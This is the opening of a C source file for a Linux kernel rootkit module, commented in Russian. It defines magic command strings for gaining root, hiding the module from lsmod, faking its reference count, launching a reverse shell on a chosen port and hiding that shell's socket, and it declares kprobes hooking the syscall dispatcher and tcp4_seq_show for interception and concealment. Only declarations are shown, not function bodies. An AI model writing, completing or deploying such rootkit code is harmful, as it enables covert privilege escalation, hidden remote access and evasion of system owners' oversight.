#include <linux/module.h>  // для модуля ядра=default
#include <linux/kernel.h>  // для дебага - pr_info()
#include <linux/kprobes.h> 
#include <asm/unistd_64.h> // Для доступа к номерам системных вызовов
#include <linux/sched.h>   // Для доступа к  struct current
#include <linux/types.h>   // Для доступа к типу данных u8 

#include <net/inet_connection_sock.h> // для inet_csk_get_port
#include <linux/inet.h>     // Создание временного сокета + доступ к необходимым структурам
#include <linux/socket.h>   // 
#include <net/sock.h>       //

MODULE_LICENSE("GPL");  
                                                                                            /* Rootkit commands */
#define ROOT "wanna_root"   // получение рута.
#define HIDE "wanna_hide"   // скрытие модуля от команды lsmod (самоудаление из списка загруженных модулей ядра).
#define SHOW "wanna_show"   // отмена предыдущей команды.
#define NORM "wanna_norm"   // подмена кол-ва ссылок на текущий модуль. 
#define YERM "wanna_yerm"   // отмена предыдущей команды.
#define SHLL "wanna_shll"   // reverse shell на определенном порту.
#define HIDP "wanna_hidp"   // "скрытие" reverse shell.

                                                                                        /*   Global variables   */


static char *argv[4] = {"/bin/sh","-c", NULL, NULL};

static int  hid_port = 0;                           // маскирование сокета данного порта
static int  port = 0;                               // для run_shell_delay()
static int  hidden = 0;                              
static struct  socket *sock_tmp;                    // для getFreePort()
static struct  list_head *module_previous = NULL;   
static struct  work_struct wrk;                     // структура для отложенного вызова процедуры
static struct  sock *sk;
u8 stop = 0;                                        // примитив синхронизации

                                                                                        /*   Functions   */
static int  tcp_hid_func(struct kprobe *,  struct pt_regs *);
static int  intercept(struct kprobe *,  struct pt_regs *);
static int  get_root(void);
static int  getFreePort(void);
static void  run_shell_nodelay(int);
static void  run_shell_delay(struct work_struct *);

static inline void  get_god(void);
static inline void  rm_god(void);
static inline void  module_show(void);
static inline void  module_hide(void);
static inline void  bit_set(u8 *, int );
static inline void  bit_unset(u8 *, int );
static inline int   bit_chk(u8 *, int );

static struct kprobe  un = {
    .symbol_name = "x64_sys_call", 
    .pre_handler = intercept,      
};

static struct kprobe  tcp_hid = {
    .symbol_name = "tcp4_seq_show",
    .pre_handler = tcp_hid_func,
};

static int __init  init(void);
static void __exit bye(void);


